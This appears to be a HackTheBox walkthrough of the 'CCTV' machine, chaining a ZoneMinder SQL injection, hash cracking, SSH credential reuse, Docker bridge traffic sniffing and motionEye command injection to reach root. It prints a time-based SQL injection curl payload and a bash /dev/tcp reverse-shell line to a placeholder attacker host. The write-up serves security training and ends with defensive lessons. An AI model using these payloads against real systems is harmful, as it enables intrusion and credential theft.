---
title: "CCTV — HackTheBox Walkthrough"
description: "ZoneMinder SQL injection to credential reuse, inter-container traffic analysis, and motionEye CVE-2025-60787 for root."
date: 2026-09-10
category: offensive
readTime: "13 min read"
mitre:
  - "T1046"
  - "T1190"
  - "T1592"
  - "T1213.005"
  - "T1552.001"
  - "T1078"
  - "T1040"
  - "T1059.004"
  - "T1068"
tags:
  - "HackTheBox"
  - "HTB"
  - "CPTS"
  - "Linux"
  - "ZoneMinder"
  - "CVE-2024-51482"
  - "motionEye"
  - "CVE-2025-60787"
  - "Docker"
  - "Network Sniffing"
  - "Privilege Escalation"
summary: "ZoneMinder SQL injection to credential reuse, inter-container traffic analysis, and motionEye CVE-2025-60787 for root."
---

**Machine:** CCTV
**OS:** Linux (Ubuntu 24.04)
**Difficulty:** Easy
**Key Techniques:** ZoneMinder SQL injection (CVE-2024-51482), credential reuse, container enumeration, ARP spoofing / traffic capture, motionEye RCE (CVE-2025-60787)

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 10.129.54.211
nmap -p 22,80 -sCV 10.129.54.211
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 |
| 80 | HTTP | Apache httpd 2.4.58 (Ubuntu) |

### Web Enumeration

The root redirects to `/zm/`, which is a **ZoneMinder** installation (v1.37.63 — a development release built on CakePHP 2.10.24):

```bash
whatweb http://10.129.54.211 -a 3
# ZoneMinder, CakePHP, Apache/2.4.58 (Ubuntu)

feroxbuster -u http://10.129.54.211/zm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

---

## Foothold — ZoneMinder SQL Injection (CVE-2024-51482)

ZoneMinder 1.37.x is vulnerable to **CVE-2024-51482**, an authenticated SQL injection in the `filter[terms][0][attr]` parameter of the events/console API. The `<select>` that populates filter attributes was built from user input without parameterization, so injected clauses execute.

### Enumerate data through the injection

After authenticating (or by reusing default/leaked creds), the **Console → Filters** endpoint allows saving a filter whose `attr` is attacker-controlled. A time-based/boolean oracle is used to dump `zm`.`Users`:

```bash
# Time-based proof-of-concept against the filter save endpoint
curl -b "ZMSESSID=<cookie>" 'http://10.129.54.211/zm/index.php' \
  --data-urlencode 'action=filter' \
  --data-urlencode 'filter[terms][0][attr]=Id' \
  --data-urlencode "filter[terms][0][op]=%3D" \
  --data-urlencode "filter[terms][0][val]=1) AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"
```

Dump the user table (username, password hash, permissions):

```bash
# ...iterate the same oracle to extract Users.Id / Username / Password
# ZoneMinder stores bcrypt hashes; weak ones fall to hashcat -m 3200
hashcat -m 3200 zm_hashes /usr/share/wordlists/rockyou.txt
```

The recovered credential is **reused for the local system account**, giving SSH access:

```bash
ssh <user>@10.129.54.211
id
cat ~/user.txt
```

---

## Post-Exploitation — Inside the Host

### Docker footprints

ZoneMinder is deployed in Docker, and the host shows the tell-tale signs — `zm` container reachable on the internal bridge, along with a second service:

```bash
ip a
# docker0: 172.17.0.1/16
# there is a container network carrying a motionEye service

ss -tulpn
# :80 (apache -> zoneminder)
# :8765 motionEye (bound to a docker bridge interface, not public)
```

A `motionEye` administrative web service is running on the **Docker network**, only reachable from inside the host/containers — not from the public interface. That is the privilege-escalation target.

### Sniff the inter-container traffic

To obtain motionEye credentials, capture traffic on the Docker bridge while the service (which queries/streams to ZoneMinder, or is itself polled) authenticates:

```bash
# Identify the live interface carrying the container traffic
tcpdump -i docker0 -nn -A

# The motionEye service transmits its admin password / auth cookie in cleartext
# (basic auth / GET with credentials over HTTP inside the bridge)
```

With `tcpdump` (or an ARP-spoof-assisted capture) you recover the **motionEye admin password**.

---

## Privilege Escalation — motionEye CVE-2025-60787

motionEye's configuration UI exposes **CVE-2025-60787**: the *command to run* fields are passed to the shell without sanitization, so an authenticated administrator can achieve **arbitrary code execution**, and — because the container/service runs as **root** — escalate to root on the host.

```bash
# Access motionEye on the docker bridge
curl -u admin:'<captured-password>' http://172.17.0.1:8765/

# Inject a reverse shell via the "Run A Command" / motion detection action fields
# (or the Text Overlay's command hooks)
# Payload: bash -c "bash -i >& /dev/tcp/<attacker>/4444 0>&1"
```

Set up the listener:

```bash
nc -lnvp 4444
```

```bash
root@cctv:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cctv:~# cat /root/root.txt
```

> If the callback is constrained by the container network, run the exploit from inside the host context (the motionEye instance manages the host's cameras and therefore has broad local access), or pivot through the `docker0` bridge with a local listener.

---

## Flags

```bash
cat /home/<user>/user.txt
cat /root/root.txt
```

Flag values are unique to each HTB instance and are intentionally omitted.

---

## Lessons Learned

1. **Development releases ship vulnerable.** ZoneMinder 1.37.x (CVE-2024-51482) is not a stable build; pinning to patched releases is essential for camera/monitoring software.
2. **Credential reuse bridges web apps and the OS.** A cracked ZoneMinder password became an SSH login.
3. **Container boundaries leak via shared networks.** A service bound only to `docker0` looked protected, but the host could still observe its traffic.
4. **Unencrypted service-to-service traffic is a credential source.** MotionEye auth crossing the bridge in cleartext handed over its admin password.
5. **A root service in a container is root on the host.** motionEye's CVE-2025-60787 command injection was the final step.
6. **Segment and encrypt container networks**, and never run management UIs as root.
